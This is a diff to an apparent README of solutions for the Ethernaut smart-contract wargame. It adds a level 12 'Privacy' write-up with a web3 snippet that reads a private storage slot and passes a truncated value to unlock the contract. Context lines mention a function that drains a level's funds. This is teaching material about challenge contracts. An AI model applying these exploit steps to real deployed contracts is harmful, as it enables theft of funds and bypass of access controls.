@@ -71,3 +71,12 @@ Afterwards, just call the `drainVictim()` function to steal all funds from the l
 Compile [Building.sol](./solutions/Building.sol) and deploy it to the Rinkeby testnet with e.g. Remix IDE and MetaMask (Injected Web3).
 Afterwards, just call the `goToTop(address _elevatorContract)` function with the level `instance` address as first argument.
 
+## 12. Privacy
+
+See [Layout of State Variables in Storage](https://docs.soliditylang.org/en/v0.6.12/internals/layout_in_storage.html).
+```
+const data2_32 = await web3.eth.getStorageAt(instance, 5); // get private storage variable 'data[2]' from contract
+const data2_16 = data2_32.substring(0, data2_32.length - 32); // remove last 16 bytes from data[2], i.e. typecast from bytes32 to bytes16
+await contract.unlock(data2_16);
+```
+
